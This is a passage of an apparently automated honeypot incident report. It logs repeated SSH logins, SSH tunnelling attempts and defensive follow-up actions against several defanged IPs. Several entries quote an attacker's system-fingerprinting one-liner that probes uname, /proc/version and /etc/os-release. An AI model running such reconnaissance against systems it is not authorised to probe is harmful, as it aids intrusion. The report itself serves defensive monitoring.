| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:00:22` | `cowrie.session.connect` |
| `2026-07-24 17:00:23` | `cowrie.client.version` |
| `2026-07-24 17:00:23` | `cowrie.client.kex` |
| `2026-07-24 17:00:24` | `cowrie.login.success` |
| `2026-07-24 17:00:26` | `cowrie.session.params` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:26` | `cowrie.command.success` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:26` | `cowrie.command.input` |
| `2026-07-24 17:00:27` | `cowrie.log.closed` |
| `2026-07-24 17:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd2ec4962a0f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:01 |
| **Last Seen** | 2026-07-24 17:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:01:41` | `cowrie.session.connect` |
| `2026-07-24 17:01:42` | `cowrie.client.version` |
| `2026-07-24 17:01:42` | `cowrie.client.kex` |
| `2026-07-24 17:01:42` | `cowrie.login.success` |
| `2026-07-24 17:01:44` | `cowrie.session.params` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:44` | `cowrie.command.success` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:44` | `cowrie.command.input` |
| `2026-07-24 17:01:45` | `cowrie.log.closed` |
| `2026-07-24 17:01:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-102da640e69b

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-07-24 17:02 |
| **Last Seen** | 2026-07-24 17:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:02:12` | `cowrie.session.connect` |
| `2026-07-24 17:02:13` | `cowrie.client.version` |
| `2026-07-24 17:02:13` | `cowrie.client.kex` |
| `2026-07-24 17:02:15` | `cowrie.login.success` |
| `2026-07-24 17:02:16` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-226da560a708

| Field | Detail |
|---|---|
| **Source IP** | `65.20.149[.]239` |
| **First Seen** | 2026-07-24 17:02 |
| **Last Seen** | 2026-07-24 17:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:02:41` | `cowrie.session.connect` |
| `2026-07-24 17:02:41` | `cowrie.client.version` |
| `2026-07-24 17:02:41` | `cowrie.client.kex` |
| `2026-07-24 17:02:43` | `cowrie.login.success` |
| `2026-07-24 17:02:43` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.149[.]239` to AbuseIPDB if not already reported
- [ ] Block `65.20.149[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4de555c53b4

| Field | Detail |
|---|---|
| **Source IP** | `179.189.85[.]66` |
| **First Seen** | 2026-07-24 17:02 |
| **Last Seen** | 2026-07-24 17:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:02:49` | `cowrie.session.connect` |
| `2026-07-24 17:02:50` | `cowrie.client.version` |
| `2026-07-24 17:02:50` | `cowrie.client.kex` |
| `2026-07-24 17:02:52` | `cowrie.login.success` |
| `2026-07-24 17:02:53` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.189.85[.]66` to AbuseIPDB if not already reported
- [ ] Block `179.189.85[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76c0f40de49

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:03 |
| **Last Seen** | 2026-07-24 17:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:03:00` | `cowrie.session.connect` |
| `2026-07-24 17:03:01` | `cowrie.client.version` |
| `2026-07-24 17:03:01` | `cowrie.client.kex` |
| `2026-07-24 17:03:04` | `cowrie.login.success` |
| `2026-07-24 17:03:06` | `cowrie.session.params` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.command.success` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.command.input` |
| `2026-07-24 17:03:06` | `cowrie.log.closed` |
| `2026-07-24 17:03:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8df41afad564

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:04 |
| **Last Seen** | 2026-07-24 17:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:04:18` | `cowrie.session.connect` |
| `2026-07-24 17:04:19` | `cowrie.client.version` |
| `2026-07-24 17:04:19` | `cowrie.client.kex` |
| `2026-07-24 17:04:22` | `cowrie.login.success` |
| `2026-07-24 17:04:24` | `cowrie.session.params` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.command.success` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.command.input` |
| `2026-07-24 17:04:24` | `cowrie.log.closed` |
| `2026-07-24 17:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4369b380b1d9

| Field | Detail |
|---|---|
| **Source IP** | `96.56.228[.]149` |
| **First Seen** | 2026-07-24 17:05 |
| **Last Seen** | 2026-07-24 17:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:05:25` | `cowrie.session.connect` |
| `2026-07-24 17:05:26` | `cowrie.client.version` |
| `2026-07-24 17:05:26` | `cowrie.client.kex` |
| `2026-07-24 17:05:26` | `cowrie.login.success` |
| `2026-07-24 17:05:27` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.56.228[.]149` to AbuseIPDB if not already reported
- [ ] Block `96.56.228[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17934a805bbd

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:05 |
| **Last Seen** | 2026-07-24 17:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:05:37` | `cowrie.session.connect` |
| `2026-07-24 17:05:37` | `cowrie.client.version` |
| `2026-07-24 17:05:37` | `cowrie.client.kex` |
| `2026-07-24 17:05:40` | `cowrie.login.success` |
| `2026-07-24 17:05:42` | `cowrie.session.params` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.command.success` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.command.input` |
| `2026-07-24 17:05:42` | `cowrie.log.closed` |
| `2026-07-24 17:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ae1e0bc56c

| Field | Detail |
|---|---|
| **Source IP** | `114.98.63[.]18` |
| **First Seen** | 2026-07-24 17:05 |
| **Last Seen** | 2026-07-24 17:06 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:05:57` | `cowrie.session.connect` |
| `2026-07-24 17:05:58` | `cowrie.client.version` |
| `2026-07-24 17:05:58` | `cowrie.client.kex` |
| `2026-07-24 17:06:01` | `cowrie.login.success` |
| `2026-07-24 17:06:02` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `114.98.63[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f013ca75be

| Field | Detail |
|---|---|
| **Source IP** | `221.120.57[.]125` |
| **First Seen** | 2026-07-24 17:06 |
| **Last Seen** | 2026-07-24 17:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:06:08` | `cowrie.session.connect` |
| `2026-07-24 17:06:08` | `cowrie.client.version` |
| `2026-07-24 17:06:08` | `cowrie.client.kex` |
| `2026-07-24 17:06:10` | `cowrie.login.success` |
| `2026-07-24 17:06:11` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.57[.]125` to AbuseIPDB if not already reported
- [ ] Block `221.120.57[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-503a17621760

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:06 |
| **Last Seen** | 2026-07-24 17:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:06:55` | `cowrie.session.connect` |
| `2026-07-24 17:06:55` | `cowrie.client.version` |
| `2026-07-24 17:06:55` | `cowrie.client.kex` |
| `2026-07-24 17:06:58` | `cowrie.login.success` |
| `2026-07-24 17:07:00` | `cowrie.session.params` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:00` | `cowrie.command.success` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:00` | `cowrie.command.input` |
| `2026-07-24 17:07:01` | `cowrie.log.closed` |
| `2026-07-24 17:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa35272bc44

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:08 |
| **Last Seen** | 2026-07-24 17:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:08:12` | `cowrie.session.connect` |
| `2026-07-24 17:08:12` | `cowrie.client.version` |
| `2026-07-24 17:08:12` | `cowrie.client.kex` |
| `2026-07-24 17:08:15` | `cowrie.login.success` |
| `2026-07-24 17:08:17` | `cowrie.session.params` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.command.success` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.command.input` |
| `2026-07-24 17:08:17` | `cowrie.log.closed` |
| `2026-07-24 17:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-918c25e5246d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 17:08 |
| **Last Seen** | 2026-07-24 17:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:08:52` | `cowrie.session.connect` |
| `2026-07-24 17:08:52` | `cowrie.client.version` |
| `2026-07-24 17:08:52` | `cowrie.client.kex` |
| `2026-07-24 17:08:52` | `cowrie.login.success` |
| `2026-07-24 17:08:53` | `cowrie.direct-tcpip.request` |
| `2026-07-24 17:08:53` | `cowrie.direct-tcpip.data` |
| `2026-07-24 17:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8577e6e9b0e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:09 |
| **Last Seen** | 2026-07-24 17:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:09:30` | `cowrie.session.connect` |
| `2026-07-24 17:09:31` | `cowrie.client.version` |
| `2026-07-24 17:09:31` | `cowrie.client.kex` |
| `2026-07-24 17:09:33` | `cowrie.login.success` |
| `2026-07-24 17:09:35` | `cowrie.session.params` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:35` | `cowrie.command.success` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:35` | `cowrie.command.input` |
| `2026-07-24 17:09:36` | `cowrie.log.closed` |
| `2026-07-24 17:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf24169aeba2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 17:10 |
| **Last Seen** | 2026-07-24 17:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 17:10:48` | `cowrie.session.connect` |
| `2026-07-24 17:10:48` | `cowrie.client.version` |
| `2026-07-24 17:10:48` | `cowrie.client.kex` |
| `2026-07-24 17:10:51` | `cowrie.login.success` |
| `2026-07-24 17:10:53` | `cowrie.session.params` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:53` | `cowrie.command.success` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:53` | `cowrie.command.input` |
| `2026-07-24 17:10:54` | `cowrie.log.closed` |
